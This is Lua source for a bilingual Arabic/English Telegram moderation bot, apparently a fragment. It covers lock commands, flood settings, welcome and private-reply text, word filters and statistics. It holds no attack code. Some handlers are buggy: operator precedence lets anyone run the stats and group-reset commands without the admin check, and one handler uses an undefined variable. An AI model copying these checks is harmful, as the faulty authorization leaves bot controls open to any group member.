----------------------------------bot-------------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
local lockpt = {string.match(text, "^([Ll]ock) (.*)$")}
if is_leaderid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_sudoid(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_admin(msg.sender_user_id_) then
tar = 'المطور ✨'
elseif is_onall(msg.sender_user_id_) then
tar = 'المدير ✨'
elseif is_moall(msg.sender_user_id_) then
tar = 'الادمن ✨'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
tar = 'المنشئ ✨'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
tar = 'المدير ✨'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
tar = 'الادمن ✨'          
end
local lockptf = {string.match(text, "^(قفل) (.*)$")}
if lockpt[2] == "edit" or lockptf[2] == "التعديل" then
if not botx1:get(BOT..'editmsg'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then                  
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock edit ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التعديل • \n🎗⁞ بواسطه «'..result.first_name_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(result.first_name_))
end
botx1:set(BOT..'editmsg'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ edit is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التعديل سابقا ✔️', 1, 'md')
end
end
end     
if lockpt[2] == "cmd" or lockptf[2] == "الشارحه" then
if not botx1:get(BOT..'bot:cmds'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ Has been lock cmd ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الشارحه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:cmds'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ cmd is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الشارحه سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "bots" or lockptf[2] == "البوتات" then
if not botx1:get(BOT..'bot:bots:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then 
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات • \n📌⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:bots:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "bots ban" or lockptf[2] == "البوتات بالطرد" then
if not botx1:get(BOT..'bot:bots:ban'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots ban ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات بالطرد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 64, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:bots:ban'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked ban ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات بالطرد سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "bots keed" or lockptf[2] == "البوتات بالتقييد" then
if not botx1:get(BOT..'keed_bots'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots keed ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات بالتقييد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 66, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'keed_bots'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked keed ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات بالتقييد سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "flood" or lockptf[2] == "التكرار" then
if not botx1:get(BOT..'anti-flood:'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock flood ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التكرار • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'anti-flood:'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ flood is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التكرار سابقا ✔️', 1, 'md')
end
end
end
if lockpt[2] == "pin" or lockptf[2] == "التثبيت" then
if not botx1:get(BOT..'bot:pin:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock pin ☑️', 1, 'md')
else
local bot = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التثبيت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, bot, 57, string.len(msg.sender_user_id_))
end
botx1:set(BOT..'bot:pin:mute'..msg.chat_id_,true)
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ pin is already locked ✔️', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التثبيت سابقا ✔️', 1, 'md')
end
end
end
end
end
-----------------------------------bot------------------------------------------------------------
local text = msg.content_.text_:gsub('ضع تكرار','Setflood')
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etflood (%d+)$") then
local floodmax = {string.match(text, "^([Ss]etflood) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Select a number greater than 2 ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🎖⁞ قم بتحديد تكرار اكبر من 2 •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood sensitivity change to '..floodmax[2]..' ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚏⁞ تم تحديد التكرار للعدد '..floodmax[2]..' في المجموعه ✅', 1, 'md')
end
botx1:set(BOT..'flood:max:'..msg.chat_id_,floodmax[2])
end
end
------------------------------------bot-----------------------------------------------------------
local text = msg.content_.text_:gsub('ضع التكرار','Setstatus')
if text:match("^[Ss]etstatus (.*)$") then
local status = {string.match(text, "^([Ss]etstatus) (.*)$")}
if status[2] == "kick" or status[2] == "بالطرد" then
if botx1:get(BOT..'floodstatus'..msg.chat_id_) == "Kicked" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '📌⁞ Flood status is *already* on Kicked ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالطرد فعلا 🚏', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status change to *Kicking* ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالطرد 🚏', 1, 'md')
end
botx1:set(BOT..'floodstatus'..msg.chat_id_,'Kicked')
end
end
if status[2] == "del" or status[2] == "بالمسح" then
if botx1:get(BOT..'floodstatus'..msg.chat_id_) == "DelMsg" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status is *already* on Deleting ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالمسح فعلا🚏', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status has been change to *Deleting* ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالمسح 🚏', 1, 'md')
end
botx1:set(BOT..'floodstatus'..msg.chat_id_,'DelMsg')
end
end
end
---------------------------------------bot--------------------------------------------------------
if (text and text == 'enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Enable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بالصوره') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get('BOT:id:photo'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get id status is *already* on Photo ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بالصوره فعلا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get ID status has been changed to *Photo* ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بالصوره •', 1, 'md')
botx1:del('BOT:id:photo'..msg.chat_id_)
end end end
if (text and text == 'disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'Disable id photo') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'ضع الايدي بدون صوره') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get('BOT:id:photo'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get ID status is *already* on Simple ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بدون صوره فعلا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get ID status has been change to *Simple* ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بدون صوره •', 1, 'md')
botx1:set('BOT:id:photo'..msg.chat_id_,true)
end end end
if (text and text == 'enable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Enable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تفعيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if not botx1:get('BOT:id:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ID is already enabled • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ الايدي بالفعل تم تفعيله • ', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ID has been enable • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل الايدي • ', 1, 'md')
botx1:del('BOT:id:mute'..msg.chat_id_)
end end end
if (text and text == 'disable id') and is_owner(msg.sender_user_id_, msg.chat_id_)  or (text and text == 'Disable Id') and is_owner(msg.sender_user_id_, msg.chat_id_) or (text and text == 'تعطيل الايدي') and is_owner(msg.sender_user_id_, msg.chat_id_) then
if botx1:get('BOT:id:mute'..msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ID is already disabled • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ الايدي بالفعل تم تعطيله • ', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ID has been disable • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل الايدي • ', 1, 'md')
botx1:set('BOT:id:mute'..msg.chat_id_,true)
end end end
-------------------------------------bot----------------------------------------------------------
if is_sudo(msg) then
local text = msg.content_.text_:gsub('المغادره التلقائيه','Autoleave')
if text:match("^[Aa]utoleave (.*)$") then
local status = {string.match(text, "^([Aa]utoleave) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if botx1:get(BOT..'autoleave') == "On" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto Leave is now active ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المغادره التلقائيه فعلا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto Leave has been actived ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل المغادره التلقائيه •', 1, 'md')
end
botx1:set(BOT..'autoleave','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if botx1:get(BOT..'autoleave') == "Off" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto Leave is now deactive ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل المغادره التلقائيه فعلا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto leave has been deactived ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل المغادره التلقائيه •', 1, 'md')
end
botx1:set(BOT..'autoleave','Off')
end
end
end
---------------------------------bot--------------------------------------------------------------
local text = msg.content_.text_:gsub('رد الخاص','Clerk')
if text:match("^[Cc]lerk (.*)$") then
local status = {string.match(text, "^([Cc]lerk) (.*)$")}
if status[2] == "تفعيل" or status[2] == "on" then
if botx1:get(BOT..'clerk') == "On" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk is now active ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل رد خاص البوت فعلا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk has been actived ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل رد خاص البوت •', 1, 'md')
end
botx1:set(BOT..'clerk','On')
end
end
if status[2] == "تعطيل" or status[2] == "off" then
if botx1:get(BOT..'clerk') == "Off" then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk is now deactive ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل رد الخاص فعلا •', 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Auto leave has been deactived ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل رد خاص البوت •', 1, 'md')
end
botx1:set(BOT..'clerk','Off')
end
end
end
end
---------------------------------------------bot--------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ss]etlink$") or text:match("^ضع رابط$")  then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Plese send your group link now :', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ ارسل رابط المجموعه ليتم حفضه 📥 ', 1, 'md')
end
botx1:set(BOT.."bot:group:link"..msg.chat_id_, 'waiting')
end
------------------------------------bot-----------------------------------------------------------
if text:match("^الدعم$") or text:match("^المطور$") then
local link = botx1:get(BOT.."bot:supports:link")
if link then
if link:match("https://") then
if botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ <b>Support Link</b> :\n\n " .. link, 1, "html")
else
botdx(msg.chat_id_, msg.id_, 1, "☑️⁞ تم ارسال معلوماتك الى المطور •\n🌿⁞ سوف ياتي المطور هنا باقرب وقت •\n🚠⁞ يمكن الدخل لكروب المطور وطلب المساعده •\n🚦⁞ رابط كروب دعم البوت •\n\n " .. link, 1, "html")
end
elseif botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ <b>Support Bot ID</b> : @" .. link, 1, "html")
else
botdx(msg.chat_id_, msg.id_, 1, "☑️⁞ تم ارسال معلوماتك الى المطور •\n🌿⁞ سوف ياتي المطور هنا باقرب وقت •\n🚠⁞ يمكن الذهاب لتواصل المطور وطلب المساعده •\n🚦⁞ بوت تواصل المطور •\n\n @" .. link, 1, "html")
end
elseif botx1:get(BOT.."lang:gp:" .. msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ *Support link* is not found ", 1, "md")
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم تعيين دعم ارسل لي (ضع دعم) واتبع التعليمات 🎖', 1, 'md')
end
end

----------------------------------------bot-------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ww]elcome on$") or text:match("^تفعيل الترحيب$") then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, ' 🚦⁞  Welcome activated • ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تفعيل الترحيب •', 1, 'md')
end
botx1:set(BOT.."bot:welcome"..msg.chat_id_,true)
end
if text:match("^[Ww]elcome off$") or text:match("^تعطيل الترحيب$") then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome deactivated ', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعطيل الترحيب •', 1, 'md')
end
botx1:del(BOT.."bot:welcome"..msg.chat_id_)
end
if text:match("^ضع ترحيب (.*)$")  then
local welcome = {string.match(text, "^(ضع ترحيب) (.*)$")}
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome text has been saved \n\n🚦⁞  Welcome text :\n\n'..welcome[2], 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حفض الترحيب •\n\n🚦⁞ الترحيب هو  :\n\n'..welcome[2], 1, 'md')
end
botx1:set(BOT..'welcome:'..msg.chat_id_,welcome[2])
end
if text:match("^[Dd]el welcome$") or text:match("^حذف الترحيب$") then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome text has been removed •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حذف الترحيب •', 1, 'md')
end
botx1:del(BOT..'welcome:'..msg.chat_id_)
end
if text:match("^[Gg]et welcome$") or text:match("^جلب الترحيب$") then
local wel = botx1:get(BOT..'welcome:'..msg.chat_id_)
if wel then
botdx(msg.chat_id_, msg.id_, 1, wel, 1, 'md')
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Welcome text not found •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم وضع الترحيب •', 1, 'md')
end
end
end
end
--------------------------------------------bot---------------------------------------------------
if is_sudo(msg) then
local text = msg.content_.text_:gsub('ضع رد الخاص','Set clerk')
if text:match("^[Ss]et clerk (.*)$") then
local clerk = {string.match(text, "^([Ss]et clerk) (.*)$")}
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk text has been saved •\n🎖⁞ Welcome text :\n\n'..clerk[2], 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تعيين رد الخاص للبوت •\n\n🚦⁞ رد خاص البوت هو :\n\n'..clerk[2], 1, 'md')
end
botx1:set(BOT..'textsec',clerk[2])
end
if text:match("^[Dd]el clerk$") or text:match("^حذف رد الخاص$") then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk text has been removed •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم حذف رد الخاص •',1, 'md')
end
botx1:del(BOT..'textsec')
end
if text:match("^[Gg]et clerk$") or text:match("^جلب رد الخاص$") then
local cel = botx1:get(BOT..'textsec')
if cel then
botdx(msg.chat_id_, msg.id_, 1, cel, 1, 'md')
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Clerk text not found •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ لم يتم وضع رد للخاص ارسل (ضع رد الخاص) ليتم حفظه 📥', 1, 'md')
end
end
end
end
-------------------------------------bot----------------------------------------------------------
if text:match("^[Aa]ction (.*)$") and is_sudo(msg) then
local lockpt = {string.match(text, "^([Aa]ction) (.*)$")}
if lockpt[2] == "typing" then
sendaction(msg.chat_id_, 'Typing')
end
if lockpt[2] == "video" then
sendaction(msg.chat_id_, 'RecordVideo')
end
if lockpt[2] == "voice" then
sendaction(msg.chat_id_, 'RecordVoice')
end
if lockpt[2] == "photo" then
sendaction(msg.chat_id_, 'UploadPhoto')
end
end
------------------------------------bot-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilter (.*)$") or text:match("^منع (.*)$") then
local filters = {string.match(text, "^([Ff]ilter) (.*)$")}
local filterss = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local hash = (BOT..'bot:filters:'..msg.chat_id_)
botx1:hset(hash, name,'newword')
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞  Word [ "..name.." ] has been filtered •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🔖|| الكلمه [ "..name.." ]\n🔊|| تم منعها ✅", 1, 'md')
end
end
end
--------------------------------------bot---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter (.*)$") or text:match("^الغاء منع (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (BOT..'bot:filters:'..msg.chat_id_)
if not botx1:hget(BOT..hash, name) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word : ["..name.."] is not in filterlist •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "🔖|| الكلمه [ "..name.." ]\n🚦|| هي غير ممنوعه في المجموعه ✅", 1, 'md')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word : ["..name.."] removed from filterlist •", 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, "📌|| الكلمه [ "..name.." ]\n🔊|| تم الغاء منعها ✅", 1, 'md')
end
botx1:hdel(hash, name)
end
end
end
------------------------------------bot-----------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Ff]ilteer all (.*)$") or text:match("^فلتر عام (.*)$") then
local filters = {string.match(text, "^([Ff]Filteer all) (.*)$")}
local filterss = {string.match(text, "^(فلتر عام) (.*)$")}
local name = string.sub(filters[2] or filterss[2], 1, 50)
local hash = (BOT..'bot:freewords:')
botx1:hset(hash, name,'newword')
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word [ "..name.." ]\n🎖⁞ has been filtered all ☑️", 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ الكلمه [ "..name.." ]\n🚦⁞ تم منعها عام ☑️", 1, 'html')
end
end
end
--------------------------------------bot---------------------------------------------------------
if is_momod(msg.sender_user_id_, msg.chat_id_) then
if text:match("^[Uu]nfilter all (.*)$") or text:match("^الغاء منع عام (.*)$") then
local rws = {string.match(text, "^([Uu]nfilter all) (.*)$")}
local rwss = {string.match(text, "^(الغاء منع عام) (.*)$")}
local name = string.sub(rws[2] or rwss[2], 1, 50)
local cti = msg.chat_id_
local hash = (BOT..'bot:freewords:')
if not botx1:hget(hash, name)then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word [ "..name.." ]\n🚦⁞ is not in filtered all ☑️", 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ الكلمه [ "..name.." ]\n🚦⁞ هي ليست ممنوعه عام ☑️", 1, 'html')
end
else
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ Word [ "..name.." ]\n🚦⁞ removed from filtered all ☑️", 1, 'html')
else
botdx(msg.chat_id_, msg.id_, 1, "🚦⁞ الكلمه [ "..name.." ]\n🚦⁞ تم الغاء منعها عام ☑️", 1, 'html')
end
botx1:hdel(hash, name)
end
end
end
---------------------------------------------bot--------------------------------------------------

------------------------------------bot-----------------------------------------------------------
if text:match("^[Ss]tats$") or text:match("^الاحصائيات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
local gps = botx1:scard(BOT.."bot:groups")
local users = botx1:scard(BOT.."bot:userss")
local allmgs = botx1:get(BOT.."bot:allmsgs")
if botx1:get(BOT..'autoleave') == "On" then
autoleaveen = "Active"
autoleavear = "مفعل 🚩"
elseif botx1:get(BOT..'autoleave') == "Off" then
autoleaveen = "Deactive"
autoleavear = "معطل 📍"
elseif not botx1:get(BOT..'autoleave') then
autoleaveen = "Deactive"
autoleavear = "معطل 📍"
end
if botx1:get(BOT..'clerk') == "On" then
clerken = "Active"
clerkar = "مفعل 🚩"
elseif botx1:get(BOT..'clerk') == "Off" then
clerken = "Deactive"
clerkar = "معطل 📍"
elseif not botx1:get(BOT..'clerk') then
clerken = "Deactive"
clerkar = "معطل 📍"
end
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Status 🗂 \n\n🎖⁞ Groups • '..gps..'\n\n👥⁞ Users • '..users..' \n\n📬⁞ Msg received • '..allmgs..'\n\n🎙⁞ Auto Leave • '..autoleavear..'\n\n💢⁞ Clerk • '..clerkar, 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ احصائيات البوت 🗂 \n\n🎖⁞ عدد الكروبات • '..gps..'\n\n👥⁞ عدد الاعضاء • '..users..' \n\n📬⁞ عدد كل رسائل المجموعات • '..allmgs..'\n\n🚧⁞ المغادره التلقائيه • '..autoleavear..'\n\n💢⁞ رد الخاص • '..clerkar, 1, 'md')
end
end
---------------------------------------bot---------------------------------------
if text:match("^[Rr]esgp$") or text:match("^تنظيف الكروبات$") and is_admin(msg.sender_user_id_, msg.chat_id_) then
if botx1:get(BOT..'lang:gp:'..msg.chat_id_) then
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Nubmper of groups bot has been update •', 1, 'md')
else
botdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم تنظيف الكروبات الوهميه •', 'md')
end
botx1:del(BOT.."bot:groups")
end
------------------------------------------------------------------------------
